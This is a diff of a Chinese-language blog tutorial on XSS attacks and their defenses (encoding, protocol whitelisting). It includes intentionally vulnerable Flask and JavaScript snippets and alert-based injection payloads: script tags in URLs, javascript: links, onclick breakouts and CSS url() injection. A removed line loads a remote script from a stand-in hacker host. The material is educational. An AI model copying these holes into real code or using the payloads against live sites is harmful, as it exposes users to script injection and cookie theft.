@@ -11,7 +11,7 @@
     <body>
         <h1>跨站脚本攻击XSS</h1>
 
-<p>跨站脚本攻击(Cross Site Scripting), 简称XSS(避免和CSS弄混), 是通过注入恶意JS代码的方式进行hack(业界称为"挂马"). 被<a href="https://www.owasp.org/index.php/Main_Page">OWASP</a>评为Web安全的最大威胁.</p>
+<p>跨站脚本攻击(Cross Site Scripting), 简称XSS(避免和CSS弄混), 是通过注入恶意JS代码的方式进行hack(业界称为"挂马"). 被OWASP评为Web安全的最大威胁.</p>
 
 <h2>浏览器的同源策略</h2>
 
@@ -27,7 +27,11 @@
 <p>如果设置了<strong>document.domain</strong>, 那么域名级别不同也算同源. <br/>
 同源策略除了影响<strong>cookie</strong>的读写, 还影响<strong>localStorage</strong>、<strong>indexDB</strong>的读写, <strong>iframe</strong>父窗口和子窗口间通信, 通过<strong>ajax</strong>发送http请求. <br/>
 更多关于同源以及规避同源策略的方法参考: <a href="http://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html">阮一峰:浏览器同源政策及其规避方法</a> <br/>
-虽然同源策略大大增加了跨站攻击的难度, 然而程序是人写的, 可能有出错的地方, 这些地方就是XSS攻击的爆破点!</p>
+虽然同源策略大大增加了跨站攻击的难度, 但是程序是人写的, 可能有出错的地方, 这些地方就是XSS攻击的爆破点!</p>
+
+<h2>XSS的危害</h2>
+
+<p>XSS注入的恶意脚本叫<strong>XSS Payload</strong>, XSS Payload一般是JS脚本以及其他浏览器插件脚本(比如Flash:actionscript). JS脚本可以获取cookie, 模拟登录, 模拟http请求, 修改网页... 这些都可以被XSS利用, XSS的危险性可见一斑!</p>
 
 <h2>XSS攻击分类</h2>
 
@@ -65,60 +69,118 @@ Dom-Based XSS其实也是反射型XSS的一种, 恶意代码可以通过修改DO
 
 <h2>XSS攻击及防御</h2>
 
-<h3>漏洞: 用户可以控制URL进而修改DOM节点</h3>
+<ul>
+<li><strong>攻击</strong>: 控制URL修改HTML</li>
+<li><strong>防御</strong>: URLEncode</li>
+</ul>
 
-<p>代码:</p>
+<p>假设存在漏洞网站允许用户修改HTML内容, 比如:</p>
+
+<div class="codehilite"><pre><span></span><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/user/&lt;username&gt;/&#39;</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">user</span><span class="p">(</span><span class="n">username</span><span class="p">):</span>
+    <span class="k">return</span> <span class="s2">&quot;&lt;div&gt;username: </span><span class="si">%s</span><span class="s2">&lt;/div&gt;&quot;</span> <span class="o">%</span> <span class="n">username</span>
+</pre></div>
+
+<p>攻击者可以构造恶意链接:</p>
+
+<div class="codehilite"><pre><span></span>http://localhost:5000/user/<span class="nt">&lt;script&gt;</span>alert(hack xss)<span class="nt">&lt;/script&gt;</span>/
+</pre></div>
+
+<p><br/>
+使用<strong>URLEncode</strong>可以将字符转化成<strong>%HH</strong>的形式, 比如' '转化成%20、'"'转化成%22. 这样恶意URL就变成了:</p>
+
+<div class="codehilite"><pre><span></span>http://localhost:5000/user/%3Cscript%3Ealert(hack%20xss)%3C/script%3E/
+</pre></div>
+
+<p><br/>
+但是如果用户可以完全控制URL, 考虑到URL语义的完整性, 组成URL的Protocal、Host是不会被转义的. 所以入侵者可以构造协议进行攻击, 比如:</p>
+
+<div class="codehilite"><pre><span></span><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/user/&lt;username&gt;/&#39;</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">user</span><span class="p">(</span><span class="n">username</span><span class="p">):</span>
+    <span class="n">blog</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;blog&#39;</span><span class="p">)</span>
+    <span class="k">return</span> <span class="s2">&quot;&lt;div&gt;username: </span><span class="si">%s</span><span class="s2">, &lt;a href=</span><span class="si">%s</span><span class="s2"> &gt;blog&lt;/a&gt;&lt;/div&gt;&quot;</span> \
+            <span class="o">%</span> <span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">blog</span><span class="p">)</span>
+</pre></div>
+
+<p>可以构造恶意URL:</p>
+
+<div class="codehilite"><pre><span></span>http://127.0.0.1:5000/user/neo1218/?blog=javascript:alert(1)
+</pre></div>
+
+<p><img alt="screen shot 2017-04-18 at 16 35 35" src="https://cloud.githubusercontent.com/assets/10671733/25121789/73674438-2455-11e7-8fac-1f40e8fb86af.png" />
+<br/>
+对于这种情况, 需要对用户输入的URL协议进行检查, 设置协议白名单, 对于Blog URL应该只允许http/https.
+<hr/></p>
+
+<ul>
+<li><strong>攻击</strong>: 通过表单修改HTML</li>
+<li><strong>防御</strong>: JSEncode, HTMLEncode</li>
+</ul>
+
+<p>假设存在漏洞网站允许用户通过表单修改HTML, 这需要分情况考虑, 如果修改的是HTML标签中的内容那么进行HTMLEncode,防止插入<code>&lt;script&gt;</code>标签;
+如果修改的是HTML属性比如<code>&lt;img src=用户输入&gt;, &lt;a href=用户输入&gt;</code>, 那么需要对用户输入进行JSEncode, 防止插入onclick、onerror等事件.</p>
+
+<hr/>
+
+<ul>
+<li><strong>攻击</strong>: 修改DOM节点</li>
+<li><strong>防御</strong>: JSEncode、HTMLEncode</li>
+</ul>
+
+<p>假设存在漏洞网站:</p>
 
 <div class="codehilite"><pre><span></span><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
-<span class="nb">window</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
-    <span class="kd">var</span> <span class="nx">username</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
-    <span class="kd">var</span> <span class="nx">html</span> <span class="o">=</span> <span class="s2">&quot;&lt;div&gt;username: &quot;</span> <span class="o">+</span> <span class="nx">username</span> <span class="o">+</span> <span class="s2">&quot;&lt;/div&gt;&quot;</span><span class="p">;</span>
-    <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">html</span><span class="p">;</span>
+<span class="kd">function</span> <span class="nx">editdom</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">text</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;text&#39;</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
+    <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;t&#39;</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="o">\</span>
+        <span class="s2">&quot;&lt;a href=&#39;&quot;</span> <span class="o">+</span> <span class="nx">text</span> <span class="o">+</span> <span class="s2">&quot;&#39; &gt;link&lt;/a&gt;&quot;</span><span class="p">;</span>
 <span class="p">}</span>
 <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#39;t&#39;</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text&quot;</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;text&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;&quot;</span> <span class="p">/&gt;</span>
+<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;button&quot;</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;s&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;submit&quot;</span> <span class="na">onclick</span><span class="o">=</span><span class="s">&quot;editdom()&quot;</span> <span class="p">/&gt;</span>
 </pre></div>
 
-<p>攻击:</p>
+<p>攻击者可以在text输入框中构造恶意输入</p>
 
-<div class="codehilite"><pre><span></span>诱骗用户点击恶意链接:
-www.bank.com/123/?name=<span class="nt">&lt;script</span> <span class="na">src=</span><span class="s">http://www.hack.com/xss.js</span><span class="nt">&gt;&lt;/script&gt;</span>
-加载XSS payload进行攻击.
+<div class="codehilite"><pre><span></span>&#39; onclick=alert(/xss/) &gt;//
+第一个&#39;用于闭合href, &gt;//用于闭合及注释后面的代码
 </pre></div>
 
-<p>防御:</p>
+<p><img alt="screen shot 2017-04-18 at 17 06 32" src="https://cloud.githubusercontent.com/assets/10671733/25122965/67ec0806-2459-11e7-96fd-a6adf25dbfb3.png" />
+<br/>
+考虑到修改DOM时浏览器重新渲染了页面, 防御DOM-Based XSS的方法是首先进行JSEncode保护<code>&lt;script&gt;&lt;/script&gt;</code>, 然后document.write时如果输出到HTML则进行HTMLEncode, 如果输出到JS事件或脚本则再进行一次JSEncode.
+<hr/></p>
 
-<div class="codehilite"><pre><span></span>一般用户输入是不需要&lt;script&gt;的, 可以过滤&lt;script&gt;标签.
+<ul>
+<li><strong>攻击</strong>: 修改CSS </li>
+<li><strong>防御</strong>: CSSEncode</li>
+</ul>
+
+<p>有些网站允许用户进行自定义, 对CSS进行修改, 这也会导致XSS Payload注入. 比如:</p>
+
+<div class="codehilite"><pre><span></span><span class="p">&lt;</span><span class="nt">div</span> <span class="na">style</span><span class="o">=</span><span class="s">&quot;background-image: url(用户控制)&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
 </pre></div>
 
-<p>不过过滤了script标签, 依然有可能被攻击: </p>
-
-<div class="codehilite"><pre><span></span><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
-<span class="nb">window</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
-    <span class="kd">var</span> <span class="nx">username</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mi">6</span><span class="p">);</span>
-    <span class="kd">var</span> <span class="nx">html</span> <span class="o">=</span> <span class="s2">&quot;&lt;div&gt;&lt;a href=http://www.bank.com/&quot;</span> <span class="o">+</span> <span class="o">\</span>
-               <span class="nx">username</span> <span class="o">+</span> <span class="s2">&quot;&gt;&quot;</span> <span class="o">+</span> <span class="nx">username</span> <span class="o">+</span> <span class="s2">&quot;&lt;/a&gt;&lt;/div&gt;&quot;</span><span class="p">;</span>
-    <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">html</span><span class="p">;</span>
-<span class="p">}</span>
-<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
-
-构造恶意URL:
-www.bank.com/123/?name= onclick=alert(hack xss)
-</pre></div>
-
-<div class="codehilite"><pre><span></span><span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">http://www.bank.com/</span>  <span class="na">onclick</span><span class="o">=</span><span class="s">alert(hack</span> <span class="na">xss</span><span class="err">)</span><span class="p">&gt;</span>....<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
-</pre></div>
-
-<p>这次攻击利用了JS事件. 所以对URL的转义需要彻底, 浏览器地址栏会对特殊字符进行转义,
-比如空格转义成%20, " 转义成%22, 避免构成明确的语义. <br/>
-然而彻底转义也存在漏洞, 考虑到URL的完整性, 协议和域名中的特殊字符(比如'/', '.')是不进行转义的, 如果用户可以控制整个URL, 那么hacker可以通过伪造协议进行入侵:</p>
-
-<div class="codehilite"><pre><span></span><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;javascript:alert(hack xss);&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
-这里伪造协议(javascript)和域名(alert(hack css);)发动攻击.
-</pre></div>
-
-<p><br/></p>
+<p>攻击者可以构造恶意图片URL: <code>javascript:alert(/xss/)</code>进行hack. <br/>
+防御方法就是对用户输入做CSSEncode, 将除字母、数字外的所有字符编码成16进制形式.</p>
 
 <h2>XSS蠕虫</h2>
+
+<p>说到XSS蠕虫就必须提到web安全史上第一个大规模蠕虫病毒<strong>samy warm</strong>:</p>
+
+<ul>
+<li><a href="https://www.youtube.com/watch?v=DtnuaHl378M">samy warm介绍视频</a></li>
+<li><a href="https://samy.pl/popular/tech.html">samy warm技术分析</a></li>
+<li><a href="https://www.youtube.com/watch?v=kJyGZDXCbmA">samy 本人演讲</a></li>
+</ul>
+
+<h2>Thanks</h2>
+
+<ul>
+<li>《白帽子讲Web安全》是本好书</li>
+<li>《黑客军团第二季》我已经看不明白了</li>
+</ul>
         <div id="disqus_thread"></div>
         <script>
         /**
